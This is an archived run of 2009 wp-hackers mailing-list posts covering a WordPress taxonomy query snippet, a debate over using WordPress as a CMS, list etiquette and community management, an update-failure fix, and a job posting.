> contained within the tag 'SomeTag'

Unless I misunderstand what you want, wouldn't the following work?

$term = get_term_by('name', 'SomeTag', 'post_tag');
if ( ! empty( $term->term_id ) ) {
	$cat_ids = (array) wp_get_object_terms(get_objects_in_term(
array($term->term_id), array('post_tag')), array('category'),
array('fields' => 'ids'));
}

From wordpress at dd32.id.au  Thu Oct 22 10:57:06 2009
From: wordpress at dd32.id.au (Dion Hulse (dd32))
Date: Thu, 22 Oct 2009 21:57:06 +1100
Subject: [wp-hackers] Taxnomy Q: All categories (posts>0) with posts in
 term X of another taxonomy
In-Reply-To: <674b4a3b0910220343o3e4ffea9n54b6d0a700066fa8@mail.gmail.com>
References: <op.u165s2q2spxmuu@dd32.no-ip.com>
	<674b4a3b0910220343o3e4ffea9n54b6d0a700066fa8@mail.gmail.com>
Message-ID: <op.u167dgoqspxmuu@dd32.no-ip.com>

On Thu, 22 Oct 2009 21:43:57 +1100, Austin Matzko <if.website at gmail.com>  
wrote:

> On Thu, Oct 22, 2009 at 5:23 AM, Dion Hulse (dd32)  
> <wordpress at dd32.id.au> wrote:
>> I'm looking for a function which I'm pretty sure isnt offered by  
>> WordPress's
>> Taxonomy system, Yet it seems to be something a few people might need..  
>> So
>> i'm putting a call out to see if anyone has any ideas? (ie. pre-written  
>> code
>> they'd like to share..)
>>
>> What i'm basically wanting, Is to find out the list of categories with  
>> posts
>>> 0 which exist in term X of another taxonomy..
>>
>> An example, Would be, Find all categories with more than 0 posts which  
>> are
>> contained within the tag 'SomeTag'
>
> Unless I misunderstand what you want, wouldn't the following work?
>
> $term = get_term_by('name', 'SomeTag', 'post_tag');
> if ( ! empty( $term->term_id ) ) {
> 	$cat_ids = (array) wp_get_object_terms(get_objects_in_term(
> array($term->term_id), array('post_tag')), array('category'),
> array('fields' => 'ids'));
> }

Hmm... That may indeed work.. Told you i needed a push in the right  
directiion.

I'll give it a try tomorrow! Thanks Austin

From ian at themeshaper.com  Thu Oct 22 12:26:12 2009
From: ian at themeshaper.com (Ian Stewart)
Date: Thu, 22 Oct 2009 07:26:12 -0500
Subject: [wp-hackers] WordPress as CMS (was: wordpress security)
In-Reply-To: <CC20CA8C-D1EF-47F6-BA34-5BE6730FACEC@mecus.es>
References: <7A5AABD5-6E6E-4AE9-8976-001EB6F52342@striderweb.com> 
	<862d087f0910211305i1b0a32eaga4574713316419ec@mail.gmail.com> 
	<CC20CA8C-D1EF-47F6-BA34-5BE6730FACEC@mecus.es>
Message-ID: <a8405fa30910220526v50188757q68724a7177d5b354@mail.gmail.com>

WordPress works perfectly as a CMS for small 'brochure' sites with a blog.
Can we all agree on that at least?

-- 
Ian Stewart

http://ThemeShaper.com/
http://twitter.com/iandstewart/
http://ianstewart.stumbleupon.com/

From erisds at gmail.com  Thu Oct 22 12:41:15 2009
From: erisds at gmail.com (ErisDS)
Date: Thu, 22 Oct 2009 13:41:15 +0100
Subject: [wp-hackers] WordPress as CMS (was: wordpress security)
In-Reply-To: <a8405fa30910220526v50188757q68724a7177d5b354@mail.gmail.com>
References: <7A5AABD5-6E6E-4AE9-8976-001EB6F52342@striderweb.com> 
	<862d087f0910211305i1b0a32eaga4574713316419ec@mail.gmail.com> 
	<CC20CA8C-D1EF-47F6-BA34-5BE6730FACEC@mecus.es>
	<a8405fa30910220526v50188757q68724a7177d5b354@mail.gmail.com>
Message-ID: <686d0bd70910220541s439ef55dwceb5eaa7d161a16e@mail.gmail.com>

I think the plugin is a great idea, but to make it truly useful it should
have settings which allow you to choose what you do and do not want to turn
off.

For example, I have several sites setup that use Wordpress as a CMS,
legitimately use the blog as a news section, but don't use comments.
Therefore being able to turn off the comments, but not the posts would also
be useful.


Wordpress might be first and foremost an excellent piece of blog software,
but it's excellence means that it is also one of the best CMS solutions
currently on the market. It's extensibility is one of the key features, so
why not extend it to not be a blog anymore?!

From ncrice at gmail.com  Thu Oct 22 12:45:33 2009
From: ncrice at gmail.com (Nathan Rice)
Date: Thu, 22 Oct 2009 08:45:33 -0400
Subject: [wp-hackers] WordPress as CMS (was: wordpress security)
In-Reply-To: <161617690910211347j9390557hfd03266d9a2ae40d@mail.gmail.com>
References: <7A5AABD5-6E6E-4AE9-8976-001EB6F52342@striderweb.com>
	<161617690910211347j9390557hfd03266d9a2ae40d@mail.gmail.com>
Message-ID: <862d087f0910220545pbf48efbg2ed40eeb28243b2f@mail.gmail.com>

On Wed, Oct 21, 2009 at 4:05 PM, Nathan Rice <ncrice at gmail.com> wrote:
    You're most likely about to be told either:

   1) If you want a website CMS (non-blog) then try drupal/joomla/EE
   2) If you MUST use WP as a site CMS (non-blog) just tell your client to
ignore the blog stuff.

   Good luck.

On Wed, Oct 21, 2009 at 4:47 PM, Otto <otto at ottodestruct.com> wrote:

> I don't get it. Why would anybody want to use WordPress, but disable
> all the useful features?
> ...
> My advice would be to make a plugin that erases WordPress and installs
> some other piece of software more suitable for their needs.
>


I think I deserve a round of applause for calling that one.

Here's why people use WP for a site management system, as opposed to a blog:

1. It's familiar
2. It's a damn good page management tool
3. Themes are dead simple to create, or dead cheap to purchase.

The MOST POPULAR premium themes available are the themes that help people
set up a business website (NOT blog) and give the client the ability to
manage the page content.

What are we so intent on fighting this? We get it ... you blog ... and
that's why YOU like WordPress. But with so many people wanting to use WP as
their site management system (for the reasons stated above) aren't we being
a wee bit silly when we demand that people use WP strictly as a blogging
tool?

The people have spoken loud and clear (with their wallets). They don't want
to use joomla, drupal, mediawiki, etc. They want to use WordPress. They are
voluntarily choosing to use a system that was built for something else
because it's THAT MUCH better than the alternatives.

To use the illustration from above -- they're choosing to use the coffee
maker to boil water because the stove is so horribly unusable. The coffee
maker boils water, and that's all they need to know.

From matt at sivel.net  Thu Oct 22 13:03:32 2009
From: matt at sivel.net (Matt Martz)
Date: Thu, 22 Oct 2009 09:03:32 -0400
Subject: [wp-hackers] WordPress Bike Shed Mailing List
Message-ID: <518fa9630910220603x565d8fcdw791125a4a97bde77@mail.gmail.com>

I've got this great idea.  My idea is to create a wp-bikeshed mailing
list so that all of you on this list have a place to argue endlessly
and never come to any decisions, without disrupting everyone's inboxes
with your pointless spam.

I realise you all may think you are helping move the project along but
in the end what you are doing is pushing the people who contribute the
most to WordPress off of this mailing list.  It seems like at least
once a year a user starts a flame war and I and many others end up
leaving the list because of this type of discussion, to only come back
sometime later and find the same thing happening again.  If you want
to help move the project along write a patch and submit it.  If there
are enough people who want it in core it will likely go in.  Arguing
endlessly and never coming to a decision and never acting upon what
you want is absolutely maddening.

I just want to write the damn patch and submit it so you people will
stop making my phone ding every 3 seconds to find out it is a reply to
one of these pointless conversations.

Anyway, that is my idea.  Anyone like it?  Anyone from Automattic want
to make my dream a realisation?

-- 
Matt Martz
matt at sivel.net
http://sivel.net/

From sc0ttkclark at gmail.com  Thu Oct 22 13:16:29 2009
From: sc0ttkclark at gmail.com (Scott Kingsley Clark)
Date: Thu, 22 Oct 2009 08:16:29 -0500
Subject: [wp-hackers] WordPress as CMS (was: wordpress security)
Message-ID: <4AE05B2D.40204@gmail.com>

Yes, it's time I chime in on this one ;)

As I've been silently and reluctantly holding back from jumping in on 
the conversation, many of you have plenty of points but they all say 
"WordPress is great, and it can be better".

With that said, I believe WordPress can do *anything*, especially with 
all the plugins out there. About the bloat that there is - WordPress has 
only recently (in the past few years) become more able to handle being a 
non-blog. It is *only* logical that as WordPress evolves, it should 
become more versatile for user needs.

Having some internal filters that run before certain things are turned 
"on" or "included" would be great - making it possible to pass a "false" 
through the filter which says "No, don't use that, don't even start". 
This is a look into the future, it's not an idea, it may not be the 
exact way I'm describing, but it will happen.

Some of you may be aware of the Pods CMS plugin 
(http://pods.uproot.us/), and if you are you probably know that I'm one 
of the developers on the project. It's plugins like these, that truly 
make it possible for users to use WordPress in more and more complex ways.

"There's a tool for every job" may be right, but if you're talking about 
something that runs on a LAMP/WAMP server, and you're extremely 
comfortable with the WordPress code - that phrase doesn't necessarily apply.

I've used WordPress for many things: Websites, Blogs, Websites with 
Blogs, Web Apps, Automation Systems, and just about anything that 
requires a login. Combined with the Adminimize plugin, I can easily hide 
everything not necessary. Why use WordPress? Because it's so freaking 
customizable and I *know* the code. In fact, I and plenty of other 
developers / dev shops / web firms specialize in it.

The community has been pushing towards content equality for a while, and 
other content types don't get as much love as the blog part of WordPress 
does. That's fine for now, but the community as a whole will undoubtedly 
change that in the near future. We're witnessing an exciting time for 
WordPress - it's growing and so are it's needs.

We lower the bar so everyone can blog AND have a site.

BTW, I absolutely hate Static HTML sites, I refuse to build one in this 
day and age. As a developer, it's more work and trouble long term. As a 
visitor, if the site is static vs has WP and WP Caching - there's 
virtually no difference anyway. The scope of a static site is usually 
pretty small, and most sites have a long term growth plan that aren't 
necessarily known by the people who the site is for. Yes, I'm saying 
people who want sites don't yet know what the future holds for their 
site, and don't want to have to invest in a completely new site to add a 
little here and there.

I know the WordPress framework will only get better and I stand by it. I 
donate a ton of my free time towards the WordPress, Pods, and other 
plugin communities where I can help. If you have any questions, just 
e-mail me and ask.


Best Regards,

Scott Kingsley Clark // Developer + Consultant

----------------------------------
sc0ttkclark at gmail.com
http://www.scottkclark.com/
----------------------------------

214.233.4048 // Mobile



From otto at ottodestruct.com  Thu Oct 22 13:23:18 2009
From: otto at ottodestruct.com (Otto)
Date: Thu, 22 Oct 2009 08:23:18 -0500
Subject: [wp-hackers] WordPress Bike Shed Mailing List
In-Reply-To: <518fa9630910220603x565d8fcdw791125a4a97bde77@mail.gmail.com>
References: <518fa9630910220603x565d8fcdw791125a4a97bde77@mail.gmail.com>
Message-ID: <161617690910220623t165a0e88oe7ab937b9f9c7a46@mail.gmail.com>

Why are you getting a mailing list in your inbox? Make a folder, make
a rule that moves messages to the list into that folder. Check the
folder whenever you like.

As somebody who receives 600+ emails a day, filtering rules are a *must*.

If you use GMail, then use the rule:
Has the Words: listid:"wp-hackers.lists.automattic.com"

To match everything in the list.

-Otto



On Thu, Oct 22, 2009 at 8:03 AM, Matt Martz <matt at sivel.net> wrote:
> I've got this great idea. ?My idea is to create a wp-bikeshed mailing
> list so that all of you on this list have a place to argue endlessly
> and never come to any decisions, without disrupting everyone's inboxes
> with your pointless spam.
>
> I realise you all may think you are helping move the project along but
> in the end what you are doing is pushing the people who contribute the
> most to WordPress off of this mailing list. ?It seems like at least
> once a year a user starts a flame war and I and many others end up
> leaving the list because of this type of discussion, to only come back
> sometime later and find the same thing happening again. ?If you want
> to help move the project along write a patch and submit it. ?If there
> are enough people who want it in core it will likely go in. ?Arguing
> endlessly and never coming to a decision and never acting upon what
> you want is absolutely maddening.
>
> I just want to write the damn patch and submit it so you people will
> stop making my phone ding every 3 seconds to find out it is a reply to
> one of these pointless conversations.
>
> Anyway, that is my idea. ?Anyone like it? ?Anyone from Automattic want
> to make my dream a realisation?
>
> --
> Matt Martz
> matt at sivel.net
> http://sivel.net/
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From otto at ottodestruct.com  Thu Oct 22 13:26:26 2009
From: otto at ottodestruct.com (Otto)
Date: Thu, 22 Oct 2009 08:26:26 -0500
Subject: [wp-hackers] Wordpress automatic update fail-ish
In-Reply-To: <B2CCCCC7-B0D0-4DE1-992A-01FF21C0AC4E@cloudiness.com>
References: <B2CCCCC7-B0D0-4DE1-992A-01FF21C0AC4E@cloudiness.com>
Message-ID: <161617690910220626o7c1e390cg3c8377410585ae91@mail.gmail.com>

On Wed, Oct 21, 2009 at 11:02 PM, Art Delano <ajd at cloudiness.com> wrote:
> 2. There's a yellow bar on admin pages saying "An automated WordPress update
> has failed to complete - please attempt the update again now".

Delete the .maintenance file from the root directory. That should clear it up.

-Otto
Sent from Memphis, TN, United States

From skeltoac at gmail.com  Thu Oct 22 13:29:47 2009
From: skeltoac at gmail.com (Andy Skelton)
Date: Thu, 22 Oct 2009 09:29:47 -0400
Subject: [wp-hackers] WordPress Bike Shed Mailing List
In-Reply-To: <518fa9630910220603x565d8fcdw791125a4a97bde77@mail.gmail.com>
References: <518fa9630910220603x565d8fcdw791125a4a97bde77@mail.gmail.com>
Message-ID: <e6ec604d0910220629w6f7e595ey7acc11ecd7cf34a0@mail.gmail.com>

On Thu, Oct 22, 2009 at 9:03 AM, Matt Martz <matt at sivel.net> wrote:
> I've got this great idea. ?My idea is to create a wp-bikeshed mailing
> list so that all of you on this list have a place to argue endlessly
> and never come to any decisions, without disrupting everyone's inboxes
> with your pointless spam.

-1 for wp-bikeshed. Shed color arguments never happen in a forum
created for that purpose. Use wp-discuss.

+1 for "show me the code" and "put up or shut up". The people you are
complaining about on wp-hackers aren't actually hackers, i.e. won't
code or won't learn to code. Maybe their opinions have value but they
have subverted this list against the actual hackers. By all means
create a new list but that won't fix wp-hackers. You must repel
unwanted behavior.

I admit that my habit of Muting every wp-hackers thread doesn't help.
If that's the way I'm going to be I should unsubscribe.

Andy

From glenn at glennansley.com  Thu Oct 22 13:36:55 2009
From: glenn at glennansley.com (Glenn Ansley)
Date: Thu, 22 Oct 2009 09:36:55 -0400
Subject: [wp-hackers] Wordpress automatic update fail-ish
In-Reply-To: <161617690910220626o7c1e390cg3c8377410585ae91@mail.gmail.com>
References: <B2CCCCC7-B0D0-4DE1-992A-01FF21C0AC4E@cloudiness.com>
	<161617690910220626o7c1e390cg3c8377410585ae91@mail.gmail.com>
Message-ID: <7474be390910220636v5ed9a74bv2de14eb86712ceb4@mail.gmail.com>

Who's your host? We had a similar problem with 1and1. It was related
to the PHP version:
http://fullthrottledevelopment.com/auto-updating-wordpress-with-1and1-hosting

Glenn Ansley
http://fullthrottledevelopment.com
http://twitter.com/full_throttle
http://twitter.com/glennansley

On Thu, Oct 22, 2009 at 9:26 AM, Otto <otto at ottodestruct.com> wrote:
> On Wed, Oct 21, 2009 at 11:02 PM, Art Delano <ajd at cloudiness.com> wrote:
>> 2. There's a yellow bar on admin pages saying "An automated WordPress update
>> has failed to complete - please attempt the update again now".
>
> Delete the .maintenance file from the root directory. That should clear it up.
>
> -Otto
> Sent from Memphis, TN, United States
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From ncrice at gmail.com  Thu Oct 22 13:41:02 2009
From: ncrice at gmail.com (Nathan Rice)
Date: Thu, 22 Oct 2009 09:41:02 -0400
Subject: [wp-hackers] WordPress Bike Shed Mailing List
In-Reply-To: <e6ec604d0910220629w6f7e595ey7acc11ecd7cf34a0@mail.gmail.com>
References: <518fa9630910220603x565d8fcdw791125a4a97bde77@mail.gmail.com>
	<e6ec604d0910220629w6f7e595ey7acc11ecd7cf34a0@mail.gmail.com>
Message-ID: <862d087f0910220641n1ea28059u2ebe1455ca26430d@mail.gmail.com>

It's my fault for starting this thread (sort of) on hackers. It's obviously
better to have this discussion on wp-discuss (though I don't see a subscribe
link for wp-discuss here: http://codex.wordpress.org/Mailing_Lists)

Because these emails all come to the same inbox for me, I rarely
differentiate which list they are coming from.

Apologies.

------------------
Nathan Rice
WordPress and Web Development
www.nathanrice.net | twitter.com/nathanrice | www.modthemes.com


On Thu, Oct 22, 2009 at 9:29 AM, Andy Skelton <skeltoac at gmail.com> wrote:

> On Thu, Oct 22, 2009 at 9:03 AM, Matt Martz <matt at sivel.net> wrote:
> > I've got this great idea.  My idea is to create a wp-bikeshed mailing
> > list so that all of you on this list have a place to argue endlessly
> > and never come to any decisions, without disrupting everyone's inboxes
> > with your pointless spam.
>
> -1 for wp-bikeshed. Shed color arguments never happen in a forum
> created for that purpose. Use wp-discuss.
>
> +1 for "show me the code" and "put up or shut up". The people you are
> complaining about on wp-hackers aren't actually hackers, i.e. won't
> code or won't learn to code. Maybe their opinions have value but they
> have subverted this list against the actual hackers. By all means
> create a new list but that won't fix wp-hackers. You must repel
> unwanted behavior.
>
> I admit that my habit of Muting every wp-hackers thread doesn't help.
> If that's the way I'm going to be I should unsubscribe.
>
> Andy
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From lynne.pope at gmail.com  Thu Oct 22 13:46:09 2009
From: lynne.pope at gmail.com (Lynne Pope)
Date: Fri, 23 Oct 2009 02:46:09 +1300
Subject: [wp-hackers] WordPress Bike Shed Mailing List
In-Reply-To: <e6ec604d0910220629w6f7e595ey7acc11ecd7cf34a0@mail.gmail.com>
References: <518fa9630910220603x565d8fcdw791125a4a97bde77@mail.gmail.com> 
	<e6ec604d0910220629w6f7e595ey7acc11ecd7cf34a0@mail.gmail.com>
Message-ID: <427667db0910220646o7cd61afcp34976d9bc6383723@mail.gmail.com>

2009/10/23 Andy Skelton <skeltoac at gmail.com>

> On Thu, Oct 22, 2009 at 9:03 AM, Matt Martz <matt at sivel.net> wrote:
> > I've got this great idea.  My idea is to create a wp-bikeshed mailing
> > list so that all of you on this list have a place to argue endlessly
> > and never come to any decisions, without disrupting everyone's inboxes
> > with your pointless spam.
>
> -1 for wp-bikeshed. Shed color arguments never happen in a forum
> created for that purpose. Use wp-discuss.
>

The problem is, too many feature requests/ideas are posted to this list by
people who are asking others to make their ideas happen. Try pointing the
person to the ideas forum and a slanging match results. Try telling someone
that they should be posting support questions on the forum and the same
thing happens.

As a result of the noise people who want genuine feedback before wasting
their time creating a patch nobody wants just get drowned out, discouraged,
and give up.

Lynne

From otto at ottodestruct.com  Thu Oct 22 13:46:26 2009
From: otto at ottodestruct.com (Otto)
Date: Thu, 22 Oct 2009 08:46:26 -0500
Subject: [wp-hackers] WordPress Bike Shed Mailing List
In-Reply-To: <862d087f0910220641n1ea28059u2ebe1455ca26430d@mail.gmail.com>
References: <518fa9630910220603x565d8fcdw791125a4a97bde77@mail.gmail.com> 
	<e6ec604d0910220629w6f7e595ey7acc11ecd7cf34a0@mail.gmail.com> 
	<862d087f0910220641n1ea28059u2ebe1455ca26430d@mail.gmail.com>
Message-ID: <161617690910220646n1e98f5qee33bafff5de23f9@mail.gmail.com>

On Thu, Oct 22, 2009 at 8:41 AM, Nathan Rice <ncrice at gmail.com> wrote:
> It's my fault for starting this thread (sort of) on hackers. It's obviously
> better to have this discussion on wp-discuss (though I don't see a subscribe
> link for wp-discuss here: http://codex.wordpress.org/Mailing_Lists)

wp-discuss?

I can't find that one in the lists:
http://lists.automattic.com/mailman/listinfo/


-Otto
Sent from Memphis, TN, United States

From ncrice at gmail.com  Thu Oct 22 14:09:46 2009
From: ncrice at gmail.com (Nathan Rice)
Date: Thu, 22 Oct 2009 10:09:46 -0400
Subject: [wp-hackers] WordPress Bike Shed Mailing List
In-Reply-To: <161617690910220646n1e98f5qee33bafff5de23f9@mail.gmail.com>
References: <518fa9630910220603x565d8fcdw791125a4a97bde77@mail.gmail.com>
	<e6ec604d0910220629w6f7e595ey7acc11ecd7cf34a0@mail.gmail.com>
	<862d087f0910220641n1ea28059u2ebe1455ca26430d@mail.gmail.com>
	<161617690910220646n1e98f5qee33bafff5de23f9@mail.gmail.com>
Message-ID: <862d087f0910220709x25c04888k73bcf898eebafb8b@mail.gmail.com>

Otto,
Me neither. No wonder we don't have these types of conversations there! :-)

------------------
Nathan Rice
WordPress and Web Development
www.nathanrice.net | twitter.com/nathanrice | www.modthemes.com


On Thu, Oct 22, 2009 at 9:46 AM, Otto <otto at ottodestruct.com> wrote:

> On Thu, Oct 22, 2009 at 8:41 AM, Nathan Rice <ncrice at gmail.com> wrote:
> > It's my fault for starting this thread (sort of) on hackers. It's
> obviously
> > better to have this discussion on wp-discuss (though I don't see a
> subscribe
> > link for wp-discuss here: http://codex.wordpress.org/Mailing_Lists)
>
> wp-discuss?
>
> I can't find that one in the lists:
> http://lists.automattic.com/mailman/listinfo/
>
>
> -Otto
> Sent from Memphis, TN, United States
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From feeds at armeda.com  Thu Oct 22 14:12:12 2009
From: feeds at armeda.com (ARMEDA FEEDS)
Date: Thu, 22 Oct 2009 07:12:12 -0700
Subject: [wp-hackers] WordPress as CMS (was: wordpress security)
In-Reply-To: <862d087f0910220545pbf48efbg2ed40eeb28243b2f@mail.gmail.com>
References: <7A5AABD5-6E6E-4AE9-8976-001EB6F52342@striderweb.com>	<161617690910211347j9390557hfd03266d9a2ae40d@mail.gmail.com>
	<862d087f0910220545pbf48efbg2ed40eeb28243b2f@mail.gmail.com>
Message-ID: <4AE0683C.7090104@armeda.com>

I have to agree with you here. Most of the clients I work with are 
interested in using WordPress to manage their sites but don't 
necessarily need a blog for their company. It's an easy choice to make 
over drupal/joomla/EE and quite frankly, it really doesn't make sense to 
fight this.

Thinking that WP is just the best blogging platform is not giving it 
enough credit. If you aren't using it to create functional WEBSITES with 
easy content management capabilities for your clients, you and your 
clients are missing out.

Best,

Dre Armeda

Nathan Rice wrote:
> On Wed, Oct 21, 2009 at 4:05 PM, Nathan Rice <ncrice at gmail.com> wrote:
>     You're most likely about to be told either:
>
>    1) If you want a website CMS (non-blog) then try drupal/joomla/EE
>    2) If you MUST use WP as a site CMS (non-blog) just tell your client to
> ignore the blog stuff.
>
>    Good luck.
>
> On Wed, Oct 21, 2009 at 4:47 PM, Otto <otto at ottodestruct.com> wrote:
>
>   
>> I don't get it. Why would anybody want to use WordPress, but disable
>> all the useful features?
>> ...
>> My advice would be to make a plugin that erases WordPress and installs
>> some other piece of software more suitable for their needs.
>>
>>     
>
>
> I think I deserve a round of applause for calling that one.
>
> Here's why people use WP for a site management system, as opposed to a blog:
>
> 1. It's familiar
> 2. It's a damn good page management tool
> 3. Themes are dead simple to create, or dead cheap to purchase.
>
> The MOST POPULAR premium themes available are the themes that help people
> set up a business website (NOT blog) and give the client the ability to
> manage the page content.
>
> What are we so intent on fighting this? We get it ... you blog ... and
> that's why YOU like WordPress. But with so many people wanting to use WP as
> their site management system (for the reasons stated above) aren't we being
> a wee bit silly when we demand that people use WP strictly as a blogging
> tool?
>
> The people have spoken loud and clear (with their wallets). They don't want
> to use joomla, drupal, mediawiki, etc. They want to use WordPress. They are
> voluntarily choosing to use a system that was built for something else
> because it's THAT MUCH better than the alternatives.
>
> To use the illustration from above -- they're choosing to use the coffee
> maker to boil water because the stove is so horribly unusable. The coffee
> maker boils water, and that's all they need to know.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>   

From skeltoac at gmail.com  Thu Oct 22 14:18:33 2009
From: skeltoac at gmail.com (Andy Skelton)
Date: Thu, 22 Oct 2009 10:18:33 -0400
Subject: [wp-hackers] WordPress Bike Shed Mailing List
In-Reply-To: <161617690910220646n1e98f5qee33bafff5de23f9@mail.gmail.com>
References: <518fa9630910220603x565d8fcdw791125a4a97bde77@mail.gmail.com>
	<e6ec604d0910220629w6f7e595ey7acc11ecd7cf34a0@mail.gmail.com>
	<862d087f0910220641n1ea28059u2ebe1455ca26430d@mail.gmail.com>
	<161617690910220646n1e98f5qee33bafff5de23f9@mail.gmail.com>
Message-ID: <e6ec604d0910220718y6c338086p887a80e98822bc4b@mail.gmail.com>

On Thu, Oct 22, 2009 at 9:46 AM, Otto <otto at ottodestruct.com> wrote:
> wp-discuss?

I was suggesting a better name than bikeshed for a non-hackers list.

Andy

From zamoose at gmail.com  Thu Oct 22 14:23:23 2009
From: zamoose at gmail.com (Doug Stewart)
Date: Thu, 22 Oct 2009 10:23:23 -0400
Subject: [wp-hackers] Community Management (was Re: WordPress Bike Shed
	Mailing List)
Message-ID: <71ddd7490910220723l3c7bd49ao55e60b8e3b2e3563@mail.gmail.com>

All of this, at least to me, points to a rather pressing need on
WordPress/Automattic's part to hire/appoint a Community Manager, ala
Jono Bacon in the Ubuntu/Canonical world or Glynn Foster for
OpenSolaris/Sun.

WordPress (and Ubuntu, and OpenSolaris, and Drupal, etc., ad
infinitum) is NOT simply about code -- it's just as much about the
community.  You can have the best-coded piece of software, available
under the best and most expressive license imaginable, but if you
don't have people excited about using it, you're sunk.

WordCamps, meetups, etc. have largely been successful in keeping folks
from a certain locality excited and engaged and there are multiple
ways to get plugged in, from the mailing lists to the IRC meetings to
Ideas/Kvetches, but there's no single unifying presence showing a
clear direction.

I mean, take a look at the .org front page, *really* take a look at
it.  Say you're a prospective WordPress user/contributor.  What part
says "This is how you get involved"?  To my eye, not a single part.
It's focused on "Hey, you want to use WordPress for a site, here's
plugins and themes and ways to do what you want", but it lacks a "This
is how you give back" punch.

I think those of us who have been on the wp-* mailing lists for ages
have lost sight of this in many ways and, in essence, are squandering
the potential resource that is the WordPress community (writ large),
and so you get users (and worse, active code contributors) who get
frustrated and leave the lists, and sometimes even the community as a
whole.

Writing code is (comparatively) easy; wrangling people is *hard*.  I
think it's a net loss to the WP project and I think we do a disservice
to the community by not having a defined way to go about this whole
"community" thing.

Just my $.02.

-- 
-Doug
http://literalbarrage.org/blog/

From wp-hackers at striderweb.com  Thu Oct 22 15:53:55 2009
From: wp-hackers at striderweb.com (wp-hackers at striderweb.com)
Date: Thu, 22 Oct 2009 10:53:55 -0500 (CDT)
Subject: [wp-hackers] WordPress Bike Shed Mailing List
In-Reply-To: <862d087f0910220641n1ea28059u2ebe1455ca26430d@mail.gmail.com>
References: <518fa9630910220603x565d8fcdw791125a4a97bde77@mail.gmail.com>
	<e6ec604d0910220629w6f7e595ey7acc11ecd7cf34a0@mail.gmail.com>
	<862d087f0910220641n1ea28059u2ebe1455ca26430d@mail.gmail.com>
Message-ID: <26601.207.135.184.38.1256226835.squirrel@striderweb.com>

Nathan Rice said:

> It's my fault for starting this thread (sort of) on hackers.
>
> Apologies.

The CMS discussion had two aspects to it, one good, one bad.

The discussion directly regarding the *how* of a proposed "CMS" plugin was
extremely useful, not only for specific advice, but for all the support
people showed for it.  This appears to be something that a *lot* of people
want, and I will definitely work on this when I have some time.  That
discussion was *exactly* what wp-hackers is good for.

The bad side was the "is not/is too" regarding *why* someone would want
such a thing.  I allowed myself to be baited by it, and jumped right into
that fray, and I should not have done so.  Others are free to think it's a
useless idea, and they are free to not use it when it's released.  And
that's the last I will say of it here.

So I too offer an apology.  I'm sorry for helping perpetuate the "why"
discussion.  It served little purpose and went on too long.  I'll try to
avoid the useless discussions in the future.

I would also like to say thank you to everyone who offered advice, and
everyone who showed support for the idea.  In comparison to the deafening
silence that has accompanied some of my other ideas, it's encouraging to
say the least.  I'm sure I'll be popping up again to ask about how to
accomplish certain things.  Some of the ideas (and code!) presented were
*very* useful, and probably better than the ways I may have tried to do
things on my own.

And with that said, this is the last I hope to say of it until I've
written some code. ;-)

Sincerely,

Stephen Rider


From blewis at wikimedia.org  Thu Oct 22 17:51:28 2009
From: blewis at wikimedia.org (Blair Lewis)
Date: Thu, 22 Oct 2009 10:51:28 -0700
Subject: [wp-hackers] Wikimedia Foundation Opening
Message-ID: <4AE09BA0.6040609@wikimedia.org>

Hello All,

I apologize for the inconvenience as I realize this is not typically the 
venue for such an email, but given what I suspect is a wide support for 
the Wikimedia Foundation and its mission I felt you would all be 
interested in helping us with our search.  We are currently looking for 
a Code Maintenance Engineer who will own all the code submissions from 
our volunteers worldwide (JD attached).  We are looking for strong PHP 
developers with open source project development experience who can wear 
the hat of coder, architect and QA engineer.  This role will be located 
in our downtown San Francisco office.  If you are interested feel free 
to contact me at my email below or visit our job link at:

http://wikimediafoundation.org/wiki/Job_openings/Code_Maintenance_Engineer

Please feel free to pass this message along to whomever you like.  We 
will also have additional roles coming in the following months, so if 
working with the foundation is of interest to you and you have strong 
PHP skills please contact me.

Thank you and again I'm sorry for the bother to those of you who this 
does not interest.

All the Best,

-- 

Blair Lewis
Recruiter, Wikimedia Foundation
blewis at wikimedia.org

From voschristina at gmail.com  Thu Oct 22 17:58:52 2009
From: voschristina at gmail.com (Christina Nelson)
Date: Thu, 22 Oct 2009 13:58:52 -0400
Subject: [wp-hackers] UNsubscribe
In-Reply-To: <mailman.4796.1256233896.16651.wp-hackers@lists.automattic.com>
References: <mailman.4796.1256233896.16651.wp-hackers@lists.automattic.com>
Message-ID: <4AE09D5C.3080700@gmail.com>



wp-hackers-request at lists.automattic.com wrote:
> Send wp-hackers mailing list submissions to
> 	wp-hackers at lists.automattic.com
>
> To subscribe or unsubscribe via the World Wide Web, visit
> 	http://lists.automattic.com/mailman/listinfo/wp-hackers
> or, via email, send a message with subject or body 'help' to
> 	wp-hackers-request at lists.automattic.com
>
> You can reach the person managing the list at
> 	wp-hackers-owner at lists.automattic.com
>
> When replying, please edit your Subject line so it is more specific
> than "Re: Contents of wp-hackers digest..."
>
>
> Today's Topics:
>
>    1. Re: WordPress Bike Shed Mailing List (Nathan Rice)
>    2. Re: WordPress Bike Shed Mailing List (Lynne Pope)
>    3. Re: WordPress Bike Shed Mailing List (Otto)
>    4. Re: WordPress Bike Shed Mailing List (Nathan Rice)
>    5. Re: WordPress as CMS (was: wordpress security) (ARMEDA FEEDS)
>    6. Re: WordPress Bike Shed Mailing List (Andy Skelton)
>    7. Community Management (was Re: WordPress Bike Shed	Mailing
>       List) (Doug Stewart)
>    8. Re: WordPress Bike Shed Mailing List (wp-hackers at striderweb.com)
>    9. Wikimedia Foundation Opening (Blair Lewis)
>
>
> ----------------------------------------------------------------------
>
> Message: 1
> Date: Thu, 22 Oct 2009 09:41:02 -0400
> From: Nathan Rice <ncrice at gmail.com>
> Subject: Re: [wp-hackers] WordPress Bike Shed Mailing List
> To: wp-hackers at lists.automattic.com
> Message-ID:
> 	<862d087f0910220641n1ea28059u2ebe1455ca26430d at mail.gmail.com>
> Content-Type: text/plain; charset=ISO-8859-1
>
> It's my fault for starting this thread (sort of) on hackers. It's obviously
